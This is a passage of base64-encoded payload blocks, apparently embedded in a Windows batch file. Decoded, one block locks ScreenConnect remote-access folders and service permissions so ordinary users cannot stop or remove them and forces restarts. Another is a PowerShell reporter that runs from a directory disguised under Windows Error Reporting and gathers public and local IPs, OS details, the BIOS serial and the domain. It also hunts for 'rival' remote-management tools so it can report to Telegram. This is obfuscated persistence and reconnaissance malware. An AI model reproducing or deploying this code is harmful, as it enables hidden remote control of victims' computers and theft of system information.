::UEYlXFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICAgICIlUEY4
::NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICAgIiVQRjg2
::JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICAgICAiJVBGODYl
::XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDMlKSINCiAgICApIGRvICgNCiAg
::ICAgIGlmIGV4aXN0ICIlJX5EIiAoDQogICAgICAgIHRha2Vvd24gL0YgIiUlfkQi
::IC9SIC9EIFkgPm51bCAyPiYxDQogICAgICAgIGljYWNscyAiJSV+RCIgL3Jlc2V0
::IC9UIC9DIC9RID5udWwgMj4mMQ0KICAgICAgICBpY2FjbHMgIiUlfkQiIC9ncmFu
::dCAiTlQgQVVUSE9SSVRZXFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWlu
::aXN0cmF0b3JzOihPSSkoQ0kpRiIgPm51bCAyPiYxDQogICAgICApDQogICAgKQ0K
::ICAgIGVjaG8gc2Nfbm9sb2NrX2RpcnM+JVdEJVxzZWN1cmVfc2MuZmxhZw0KICAp
::DQopIGVsc2UgKA0KICBlY2hvIHNjX25vbG9ja19kaXJzPiVXRCVcc2VjdXJlX3Nj
::LmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNlczogU1lTVEVNIGNhbiBjb25m
::aWcvc3RvcC9kZWxldGUvc2RzZXQ7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQgLS0t
::DQpSRU0gUzEyOiBTWSBtdXN0IGluY2x1ZGUgU0QgKERFTEVURSkgKyBXRCAoV1JJ
::VEVfREFDKSArIFdQIHNvIG9ycGhhbiBoZWFsIC8gRlAgbWlncmF0aW9uIC8NClJF
::TSBzYyBzZHNldCByZS1hcHBseSB3b3JrIHVuZGVyIFNZU1RFTSAodGFza3MgcnVu
::IGFzIFNZU1RFTSkuIFdpdGhvdXQgU0QsIHNjIGRlbGV0ZSBBY2Nlc3MgRGVuaWVk
::Lg0Kc2V0ICJTRD1EOihBOztDQ0RDTENTV1JQV1BEVExPQ1JSQ1NEV1A7OztTWSko
::QTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2Rz
::ZXQgIiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxU
::JSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlR1JZWEElIiAiJVNE
::JSIgPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlUFJJTSUiIHN0YXJ0PSBhdXRv
::ID5udWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUFMVCUiIHN0YXJ0PSBhdXRvID5u
::dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJUdSWVhBJSIgc3RhcnQ9IGF1dG8gPm51
::bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAg
::Pm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBh
::Y3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAw
::MCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlR1JZWEElIiByZXNldD0gODY0
::MDAgYWN0aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQv
::NjAwMDAgPm51bCAyPiYxDQoNCmVjaG8gc2VjdXJlX2RvbmU+PiIlTE9HJSINCmV4
::aXQgL2IgMA0KDQo6TG9ja0Rpcg0Kc2V0ICJUPSV+MSINCmlmIG5vdCBleGlzdCAi
::JVQlIiBleGl0IC9iIDANClJFTSB0YWtlIG93bmVyc2hpcCB0aGVuIHN0cmlwIGlu
::aGVyaXRlZCBBQ0VzOyBTWVNURU0rQWRtaW5zIG9ubHkNCnRha2Vvd24gL0YgIiVU
::JSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvaW5oZXJpdGFuY2U6
::ciA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvZ3JhbnQ6ciAiTlQgQVVUSE9SSVRZ
::XFNZU1RFTTooT0kpKENJKUYiICJCVUlMVElOXEFkbWluaXN0cmF0b3JzOihPSSko
::Q0kpRiIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL3JlbW92ZTpnICJVc2VycyIg
::IkF1dGhlbnRpY2F0ZWQgVXNlcnMiICJFdmVyeW9uZSIgIk5UIEFVVEhPUklUWVxJ
::TlRFUkFDVElWRSIgIkJVSUxUSU5cVXNlcnMiID5udWwgMj4mMQ0KZXhpdCAvYiAw
::DQo=
::B64_SEC_END
::B64_TGR_BEGIN
::I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4
::MDJUMTYgLSByb290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBv
::d25lcnNoaXA7IFJNTStEYXR0byBrZWVwOyBkeW5hbWljIGdyeXhhIEZQDQpwYXJh
::bSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5nXSRT
::dGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10k
::V29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
::VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAg
::ICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUg
::PSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3Ry
::aW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJlbmNlID0g
::J1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVu
::dGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpT
::ZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRs
::czEyIH0gY2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGgg
::PSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7
::fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJldHVybiAkY2Zn
::IH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAt
::OV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRj
::aGVzWzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0K
::ICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7
::DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVy
::biAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZsdDsn
::IC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGlj
::SXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
::Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmln
::Lm1lL2lwJywNCiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQog
::ICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52
::b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1UaW1lb3V0
::U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmlu
::ZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30o
::XC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlw
::IH0NCiAgICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScN
::Cn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAg
::ICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1F
::cnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
::LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8u
::UHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNl
::bGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQog
::ICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQog
::ICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2lt
::SW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1GaWx0
::ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVj
::dCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
::bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAg
::ICBpZiAoJGlwcykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5p
::cXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAn
::bi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9IFtvcmRl
::cmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2En
::OyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0g
::J24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAg
::ICAgICAgQ1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9
::ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICdu
::L2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9ICduL2EnDQog
::ICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
::aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5D
::YXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAg
::ICAkby5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0g
::JG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRv
::cy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0K
::ICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBHZXQt
::RGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90
::YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
::aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAg
::ICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAg
::ICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRv
::bWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8uTWFudWZh
::Y3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRj
::cy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5D
::UFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1P
::YmplY3QgLUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRj
::aCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5z
::dGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBjYXRjaCB7fQ0K
::ICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
::Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRp
::c2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEp
::DQogICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXpl
::IC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0K
::ZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkgew0KICAgICRzID0g
::R2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQn
::IH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
::JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3Ry
::aW5nXSR0bikgew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1RO
::ICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUg
::LW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsgUHJlc2Vu
::dCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3Qg
::PSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAk
::bWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsg
::IiRfIiB9KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkg
::ew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiop
::XHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9
::ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
::dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0
::YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0
::dXMpIHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydO
::ZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcn
::IH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgt
::bm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFwWydM
::YXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0g
::JycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
::dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMg
::PSAoJGJsb2IgLW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxc
::Lnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dz
::IGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZvciB1cw0K
::ICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFk
::eXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJl
::dHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAg
::ICA9IFtib29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRo
::eQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVs
::c2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAkbmV4dA0KICAg
::ICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
::CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycg
::fSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERl
::dGVjdCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFs
::bG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0K
::ICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdE
::V0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFuJywN
::CiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRv
::cCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
::V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1N
::JywgJ05pbmphT25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50
::TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0
::bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAnVUVNUycs
::ICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldp
::bmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAn
::TGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9t
::Z2FyJywgJ0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwn
::LCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNh
::bHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2JywgJ3JlbW90
::aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
::cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywN
::CiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlC
::b3QnLCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9t
::b3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdl
::ZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxveScsICdQRFEgSW52
::ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdOLWNl
::bnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9u
::aXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
::ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVy
::aXVzJywgJ0lTTCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZO
::QycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRv
::JywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tFbmRwb2lu
::dCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5H
::ZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5j
::dGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAg
::ICAgICAgJGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQog
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0K
::ICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2b2lkXSRoaXRz
::LkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
::JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3Ry
::aW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2Ug
::fQ0KICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0
::dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMp
::IHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAg
::ICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAg
::ICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
::CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUg
::JGQpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicg
::LW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNl
::KicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRvJyAoIiRu
::ICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJl
::dHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
::IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtl
::ICIqJHQqIikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAo
::JCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9jZXNzIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBO
::YW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
::bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAg
::ICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJy
::ZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkdW5p
::bnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5k
::b3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06
::XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRW
::ZXJzaW9uXFVuaW5zdGFsbFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBp
::biAkdW5pbnN0KSB7DQogICAgICAgIEdldC1JdGVtUHJvcGVydHkgJHBhdGggLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICAkZG4gPSAkXy5EaXNwbGF5TmFtZQ0KICAgICAgICAgICAgaWYg
::KC1ub3QgJGRuKSB7IHJldHVybiB9DQogICAgICAgICAgICBpZiAoVGVzdC1LZWVw
::TmFtZSAkZG4pIHsNCiAgICAgICAgICAgICAgICBpZiAoJGRuIC1saWtlICcqRGF0
::dG8qJyAtb3IgJGRuIC1saWtlICcqQ2VudHJhU3RhZ2UqJykgeyBBZGQtSGl0ICdr
::ZWVwLWRhdHRvJyAkZG4gfQ0KICAgICAgICAgICAgICAgIHJldHVybg0KICAgICAg
::ICAgICAgfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAnU2NyZWVuQ29ubmVj
::dConKSB7IHJldHVybiB9DQogICAgICAgICAgICBmb3JlYWNoICgkdCBpbiAkdG9r
::ZW5zKSB7DQogICAgICAgICAgICAgICAgaWYgKCRkbiAtbGlrZSAiKiR0KiIpIHsN
::CiAgICAgICAgICAgICAgICAgICAgQWRkLUhpdCAnbXNpJyAkZG4NCiAgICAgICAg
::ICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAg
::ICB9DQogICAgICAgIH0NCiAgICB9DQoNCiAgICByZXR1cm4gJGhpdHMNCn0NCg0K
::ZnVuY3Rpb24gR2V0LUdyeXhhS2VlcEZwIHsNCiAgICAkZnAgPSAnOTkwODE5OGU2
::NjhlNDc1MCcNCiAgICAkcCA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2lu
::ZG93c1xXRVJcVGVtcFwud3VjYWNoZVxncnl4YS5jZmcnDQogICAgaWYgKCRXb3Jr
::RGlyKSB7ICRwID0gSm9pbi1QYXRoICRXb3JrRGlyICdncnl4YS5jZmcnIH0NCiAg
::ICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkcCkgew0KICAgICAgICBHZXQt
::Q29udGVudCAtTGl0ZXJhbFBhdGggJHAgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1h
::dGNoICdeQ1VSUkVOVF9GUD0oWzAtOWEtZkEtRl17MTZ9KVxzKiQnKSB7ICRmcCA9
::ICRtYXRjaGVzWzFdLlRvTG93ZXIoKSB9DQogICAgICAgIH0NCiAgICB9DQogICAg
::cmV0dXJuICRmcA0KfQ0KDQpmdW5jdGlvbiBHZXQtU2NJbnN0YWxscyB7DQogICAg
